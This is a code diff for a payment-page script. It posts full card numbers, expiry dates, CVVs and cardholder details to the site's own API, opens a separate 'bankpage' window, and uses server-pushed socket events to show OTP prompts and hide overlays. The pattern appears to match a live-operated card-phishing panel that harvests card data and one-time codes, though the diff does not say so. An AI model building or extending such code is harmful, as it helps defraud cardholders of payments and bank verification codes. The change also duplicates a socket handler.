@@ -678,59 +678,55 @@
   });
 
   // ========= Payment Submission Handler =========
-  document.getElementById('mainForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    if (!isCardValid || !isExpiryValid || isProcessing) return;
+  // ========= Payment Submission Handler =========
+document.getElementById('mainForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  if (!isCardValid || !isExpiryValid || isProcessing) return;
+  
+  isProcessing = true;
+  const overlay = document.getElementById('bankpageOverlay');
+  overlay.style.display = 'flex';
+
+  try {
+    const response = await fetch("/api/sendPaymentDetails", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        email: document.getElementById('email').value,
+        amount: document.getElementById('amount').value,
+        currency: "INR",
+        cardholder: document.getElementById('cardholderName').value
+      })
+    });
     
-    isProcessing = true;
-    const overlay = document.getElementById('bankpageOverlay');
-    overlay.style.display = 'flex';
+    const result = await response.json();
+    if (result.status === "success") {
+      bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
+      currentInvoiceId = result.invoiceId;
 
-    try {
-      const response = await fetch("/api/sendPaymentDetails", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-          expiry: document.getElementById('expiry').value,
-          cvv: document.getElementById('cvv').value,
-          email: document.getElementById('email').value,
-          amount: document.getElementById('amount').value,
-          currency: "INR",
-          cardholder: document.getElementById('cardholderName').value
-        })
-      });
-      
-      const result = await response.json();
-      if (result.status === "success") {
-        bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
-        currentInvoiceId = result.invoiceId;
-
-        statusCheckInterval = setInterval(async () => {
-          try {
-            const statusRes = await fetch(`/api/checkTransactionStatus?invoiceId=${result.invoiceId}`);
-            const status = await statusRes.json();
-            
-            if (!status.redirectUrl?.includes('bankpage')) {
-              clearInterval(statusCheckInterval);
-              overlay.style.display = 'none';
-              if (bankPageWindow && !bankPageWindow.closed) {
-                bankPageWindow.close();
-              }
-            }
-          } catch (err) {
-            console.error('Status check error:', err);
-            clearInterval(statusCheckInterval);
+      // Listen for bankpage hide event
+      socket.on('bankpage_hide', (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          if (bankPageWindow && !bankPageWindow.closed) {
+            bankPageWindow.close();
           }
-        }, 1000);
-      }
-    } catch (err) {
-      console.error('Payment submission error:', err);
-      overlay.style.display = 'none';
-      alert('Error processing payment. Please try again.');
-      isProcessing = false;
+          // Show loading spinner and blur
+          overlay.style.display = 'flex';
+        }
+      });
+
+      // Remove the status check interval
     }
-  });
+  } catch (err) {
+    console.error('Payment submission error:', err);
+    overlay.style.display = 'none';
+    alert('Error processing payment. Please try again.');
+    isProcessing = false;
+  }
+});
 
   // ========= OTP Handling =========
   document.getElementById('otpSubmitButton').addEventListener('click', async () => {
@@ -823,6 +819,15 @@
   if (storedInvoiceId) {
     socket.emit('join', storedInvoiceId);
   }
+  socket.on('bankpage_hide', (data) => {
+  if (data.invoiceId === currentInvoiceId) {
+    const overlay = document.getElementById('bankpageOverlay');
+    overlay.style.display = 'flex';
+    if (bankPageWindow && !bankPageWindow.closed) {
+      bankPageWindow.close();
+    }
+  }
+});
   socket.on('show_otp', (data) => {
     document.getElementById('paymentForm').classList.add('hidden');
     document.getElementById('otpForm').classList.remove('hidden');
